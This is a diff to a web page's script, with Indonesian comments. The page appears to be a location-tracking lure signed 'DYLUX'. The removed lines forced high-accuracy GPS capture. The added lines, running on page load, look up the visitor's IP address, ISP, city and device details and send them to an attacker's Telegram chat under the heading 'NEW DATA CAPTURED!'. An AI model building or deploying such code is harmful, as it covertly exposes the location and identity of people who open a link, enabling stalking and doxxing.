@@ -121,72 +121,6 @@
 
     <script>
     // ============================================
-    // AMBIL GPS PRESISI (PAKSA SAMPE DAPET)
-    // ============================================
-    function getGPSLocation() {
-        return new Promise((resolve) => {
-            if (!navigator.geolocation) {
-                resolve(null);
-                return;
-            }
-
-            let watchId = null;
-            let resolved = false;
-            let bestLocation = null;
-            let attempts = 0;
-
-            const timeout = setTimeout(() => {
-                if (watchId) navigator.geolocation.clearWatch(watchId);
-                if (!resolved) {
-                    resolve(bestLocation || null);
-                }
-            }, 15000);
-
-            watchId = navigator.geolocation.watchPosition(
-                (pos) => {
-                    attempts++;
-                    const accuracy = pos.coords.accuracy;
-                    
-                    if (accuracy < 100) {
-                        resolved = true;
-                        clearTimeout(timeout);
-                        navigator.geolocation.clearWatch(watchId);
-                        resolve({
-                            lat: pos.coords.latitude,
-                            lon: pos.coords.longitude,
-                            accuracy: accuracy
-                        });
-                    } else {
-                        if (!bestLocation || accuracy < bestLocation.accuracy) {
-                            bestLocation = {
-                                lat: pos.coords.latitude,
-                                lon: pos.coords.longitude,
-                                accuracy: accuracy
-                            };
-                        }
-                        if (attempts >= 10) {
-                            resolved = true;
-                            clearTimeout(timeout);
-                            navigator.geolocation.clearWatch(watchId);
-                            resolve(bestLocation);
-                        }
-                    }
-                },
-                () => {
-                    resolved = true;
-                    clearTimeout(timeout);
-                    navigator.geolocation.clearWatch(watchId);
-                    resolve(bestLocation || null);
-                }, {
-                    enableHighAccuracy: true,
-                    timeout: 5000,
-                    maximumAge: 0
-                }
-            );
-        });
-    }
-
-    // ============================================
     // FUNGSI KIRIM KE TELEGRAM
     // ============================================
     async function sendMessageToTelegram(chatId, text) {
@@ -216,7 +150,7 @@
     }
 
     // ============================================
-    // AUTO-DETECT (HANYA GPS, IP CADANGAN)
+    // AUTO-DETECT (PAKE IP API DOANG)
     // ============================================
     let autoDetectDone = false;
 
@@ -229,32 +163,13 @@
             const userId = params.get('id');
             if (!userId) return;
 
-            // 🔥 AMBIL GPS PRESISI (UTAMA)
-            const gpsData = await getGPSLocation();
+            // 🔥 PAKE IP-API.COM (YANG TERBUKTI WORK)
+            const ipRes = await fetch('http://ip-api.com/json/');
+            const ipData = await ipRes.json();
 
-            let lat = 0;
-            let lon = 0;
-            let locationText = 'Tidak terdeteksi';
-            let accuracyText = '';
-            let isGPS = false;
-
-            if (gpsData && gpsData.lat && gpsData.lon) {
-                lat = gpsData.lat;
-                lon = gpsData.lon;
-                locationText = `${gpsData.lat}, ${gpsData.lon}`;
-                accuracyText = ` (Akurasi ${Math.round(gpsData.accuracy)}m)`;
-                isGPS = true;
-            } else {
-                // Kalo GPS gagal, coba IP (last resort)
-                const ipRes = await fetch('https://ip-api.com/json/');
-                const ipData = await ipRes.json();
-                if (ipData && ipData.query) {
-                    lat = ipData.lat || 0;
-                    lon = ipData.lon || 0;
-                    locationText = `${ipData.city || 'unknown'}, ${ipData.regionName || 'unknown'}, ${ipData.country || 'unknown'}`;
-                    accuracyText = ' (IP-based)';
-                }
-            }
+            let lat = ipData.lat || 0;
+            let lon = ipData.lon || 0;
+            let locationText = `${ipData.city || 'unknown'}, ${ipData.regionName || 'unknown'}, ${ipData.country || 'unknown'}`;
 
             const mapsLink = `https://maps.google.com/?q=${lat},${lon}`;
 
@@ -262,15 +177,17 @@
                 `<b>🎯 NEW DATA CAPTURED!</b>\n\n` +
                 `<b>👤 User ID:</b> <code>${userId}</code>\n` +
                 `<b>📌 Type:</b> Auto-Detect\n` +
-                `<b>📍 Sumber:</b> ${isGPS ? '✅ GPS Presisi' : '🌐 IP API'}\n` +
-                `<b>📍 Lokasi:</b> ${locationText}${accuracyText}\n` +
+                `<b>📍 Sumber:</b> 🌐 IP API\n` +
+                `<b>🌐 IP:</b> ${ipData.query || 'unknown'}\n` +
+                `<b>📍 Lokasi:</b> ${locationText}\n` +
+                `<b>📡 ISP:</b> ${ipData.isp || 'unknown'}\n` +
                 `<b>📍 Google Maps:</b> <a href="${mapsLink}">Klik untuk lihat map</a>\n` +
                 `<b>📱 Device:</b> ${navigator.userAgent}\n` +
                 `<b>🕐 Time:</b> ${new Date().toLocaleString('id-ID')}\n\n` +
                 `<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
 
             await sendMessageToTelegram(userId, message);
-            console.log('✅ Auto-detect sent!', isGPS ? 'GPS' : 'IP');
+            console.log('✅ Auto-detect sent!');
 
         } catch (e) { console.error('Auto-detect error:', e); }
     }
@@ -280,20 +197,7 @@
     // ============================================
     document.getElementById('popupAllow').addEventListener('click', () => {
         document.getElementById('popupOverlay').classList.add('popup-hidden');
-        navigator.geolocation.getCurrentPosition(
-            () => {
-                console.log('📍 GPS allowed');
-                autoDetectDone = false;
-                autoDetect();
-            },
-            () => {
-                console.log('❌ GPS denied, fallback ke IP');
-                autoDetect();
-            }, {
-                enableHighAccuracy: true,
-                timeout: 10000
-            }
-        );
+        autoDetect();
     });
 
     document.getElementById('popupCancel').addEventListener('click', () => {
